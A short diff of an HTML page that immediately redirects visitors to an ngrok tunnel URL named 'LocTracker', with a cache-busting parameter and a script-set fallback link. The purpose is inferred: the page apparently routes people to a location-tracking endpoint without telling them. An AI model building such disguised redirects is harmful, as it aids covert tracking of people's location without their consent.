@@ -3,15 +3,16 @@
 <head>
   <title>Redirecting...</title>
   <script>
-    // ← CHANGE THIS ONE LINE TO YOUR URL
-    const url = "https://e12048714b22.ngrok-free.app/LocTracker/";
-    
-    // Redirect immediately with cache-busting
+    const url = "https://e12048714b22.ngrok-free.app/LocTracker";
     window.location.replace(url + "?_=" + new Date().getTime());
   </script>
 </head>
 <body>
-  <p>Redirecting... <a href="https://YOUR-TARGET-URL-HERE">Click here if not redirected</a></p>
+  <p>Redirecting... <a id="link" href="#">Click here if not redirected</a></p>
+  <script>
+    const link = document.getElementById("link");
+    link.href = url;
+    link.innerText = url;
+  </script>
 </body>
 </html>
-
